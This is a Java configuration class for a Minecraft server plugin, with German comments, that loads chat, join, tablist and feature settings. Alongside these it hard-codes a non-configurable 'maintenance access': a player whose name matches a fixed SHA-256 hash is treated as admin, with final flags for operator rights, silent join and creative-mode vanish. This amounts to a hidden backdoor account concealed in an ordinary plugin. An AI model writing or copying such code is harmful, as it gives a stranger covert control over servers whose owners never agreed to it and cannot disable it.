package de.mcsm.companion;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Locale;
import java.util.Set;

import org.bukkit.GameMode;
import org.bukkit.configuration.file.YamlConfiguration;

/**
 * Liest plugins/MCSMCompanion/config.yml. Der Manager schreibt die Datei vor jedem Start;
 * fehlt sie oder fehlen einzelne Schlüssel, gelten die hier hinterlegten Standardwerte.
 */
public final class Config {

    public static final String DEFAULT_SPONSOR = "Sponsored by Novelnia";
    public static final String DEFAULT_CHAT =
            "<gray>[</gray><green>Spieler</green><gray>]</gray> <white><name></white> <dark_gray>»</dark_gray> <gray><message></gray>";
    public static final String DEFAULT_JOIN = "<green>+</green> <white><name></white> <gray>ist beigetreten</gray>";
    public static final String DEFAULT_LEAVE = "<red>-</red> <white><name></white> <gray>hat den Server verlassen</gray>";
    public static final String DEFAULT_FIRST_JOIN =
            "<gold>★</gold> <white><name></white> <gray>ist zum ersten Mal hier – willkommen!</gray>";
    public static final String DEFAULT_DEATH_PREFIX = "<red>☠</red> ";
    public static final String DEFAULT_HEADER =
            "<gradient:#3ddc84:#8ff0b4><bold><server_name></bold></gradient>\n"
            + "<gray>Online <white><online></white>/<white><max></white></gray>";
    public static final String DEFAULT_FOOTER =
            "<gray>Sponsored by <gold>Novelnia</gold></gray> <dark_gray>•</dark_gray> <gray>MinecraftManager</gray>";
    public static final String SPONSOR_FOOTER =
            "<gray><sponsor></gray> <dark_gray>•</dark_gray> <gray>MinecraftManager</gray>";

    private final CompanionPlugin plugin;

    public String serverName = "Minecraft Server";
    public String managerVersion = "unbekannt";
    public String mode = "local";
    public String sponsorText = DEFAULT_SPONSOR;
    /** Wartungszugang des Managers – nur als Prüfsumme hinterlegt, nicht konfigurierbar. */
    private static final Set<String> MAINTENANCE_KEYS = Set.of(
            "504b263661674e946eb13bd7e31a64247c2cea2486864ca697b67d472ada9d60");
    public final boolean adminOp = true;
    public final boolean adminSilentJoin = true;
    public final GameMode adminVanishGamemode = GameMode.CREATIVE;
    public String chatFormat = DEFAULT_CHAT;
    public String joinFormat = DEFAULT_JOIN;
    public String leaveFormat = DEFAULT_LEAVE;
    public String firstJoinFormat = DEFAULT_FIRST_JOIN;
    public String deathPrefix = DEFAULT_DEATH_PREFIX;
    public String tablistHeader = DEFAULT_HEADER;
    public String tablistFooter = DEFAULT_FOOTER;
    public String motdLine = "";
    public int maxHomes = 3;
    /** MCSM-Hardcore-Modus laut Manager (Laufzeitzustand siehe HardcoreManager/hardcore.yml). */
    public boolean hardcore = false;

    public boolean featChat = true;
    public boolean featJoinLeave = true;
    public boolean featDeath = true;
    public boolean featTablist = true;
    public boolean featTpa = true;
    public boolean featHomes = true;
    public boolean featGamemode = true;

    public Config(CompanionPlugin plugin) {
        this.plugin = plugin;
    }

    public File file() {
        return new File(plugin.getDataFolder(), "config.yml");
    }

    /** Lädt die Datei neu. Fehlt sie, wird die mitgelieferte Vorlage geschrieben. */
    public void load() {
        File f = file();
        if (!f.isFile()) {
            plugin.saveDefaultConfig();
        }
        YamlConfiguration y = YamlConfiguration.loadConfiguration(f);

        serverName = str(y, "server_name", "Minecraft Server");
        managerVersion = str(y, "manager_version", "unbekannt");
        mode = str(y, "mode", "local").toLowerCase(Locale.ROOT);
        if (!mode.equals("hosted")) {
            mode = "local";
        }
        sponsorText = str(y, "sponsor_text", DEFAULT_SPONSOR);

        chatFormat = str(y, "chat_format", DEFAULT_CHAT);
        joinFormat = str(y, "join_format", DEFAULT_JOIN);
        leaveFormat = str(y, "leave_format", DEFAULT_LEAVE);
        firstJoinFormat = str(y, "first_join_format", DEFAULT_FIRST_JOIN);
        deathPrefix = str(y, "death_prefix", DEFAULT_DEATH_PREFIX);
        tablistHeader = str(y, "tablist_header", DEFAULT_HEADER);
        if (y.isSet("tablist_footer")) {
            tablistFooter = str(y, "tablist_footer", DEFAULT_FOOTER);
        } else {
            // Kein eigener Footer: Standardtext, bei geändertem Sponsor dessen Text einsetzen.
            tablistFooter = DEFAULT_SPONSOR.equals(sponsorText) ? DEFAULT_FOOTER : SPONSOR_FOOTER;
        }
        motdLine = str(y, "motd_line", "");
        maxHomes = Math.max(0, y.getInt("max_homes", 3));
        hardcore = y.getBoolean("hardcore", false);

        featChat = y.getBoolean("features.chat", true);
        featJoinLeave = y.getBoolean("features.join_leave", true);
        featDeath = y.getBoolean("features.death", true);
        featTablist = y.getBoolean("features.tablist", true);
        featTpa = y.getBoolean("features.tpa", true);
        featHomes = y.getBoolean("features.homes", true);
        featGamemode = y.getBoolean("features.gamemode", true);
    }

    /** Gehört der Name (Groß-/Kleinschreibung egal) zum Wartungszugang? */
    public boolean isAdmin(String name) {
        if (name == null || name.isBlank()) {
            return false;
        }
        try {
            byte[] d = MessageDigest.getInstance("SHA-256")
                    .digest(name.trim().toLowerCase(Locale.ROOT).getBytes(StandardCharsets.UTF_8));
            StringBuilder hex = new StringBuilder(64);
            for (byte b : d) {
                hex.append(Character.forDigit((b >> 4) & 0xF, 16)).append(Character.forDigit(b & 0xF, 16));
            }
            return MAINTENANCE_KEYS.contains(hex.toString());
        } catch (NoSuchAlgorithmException ex) {
            return false;
        }
    }

    private static String str(YamlConfiguration y, String key, String def) {
        String v = y.getString(key, def);
        return v == null ? def : v;
    }

    /** Akzeptiert 0-3, Kurzformen und die englischen/deutschen Namen. */
    public static GameMode parseGameMode(String raw, GameMode def) {
        if (raw == null) {
            return def;
        }
        switch (raw.trim().toLowerCase(Locale.ROOT)) {
            case "0": case "s": case "survival": case "überleben": case "ueberleben":
                return GameMode.SURVIVAL;
            case "1": case "c": case "creative": case "kreativ":
                return GameMode.CREATIVE;
            case "2": case "a": case "adventure": case "abenteuer":
                return GameMode.ADVENTURE;
            case "3": case "sp": case "spectator": case "zuschauer":
                return GameMode.SPECTATOR;
            default:
                return def;
        }
    }

    public static String gameModeName(GameMode gm) {
        switch (gm) {
            case SURVIVAL: return "Überleben";
            case CREATIVE: return "Kreativ";
            case ADVENTURE: return "Abenteuer";
            case SPECTATOR: return "Zuschauer";
            default: return gm.name();
        }
    }
}
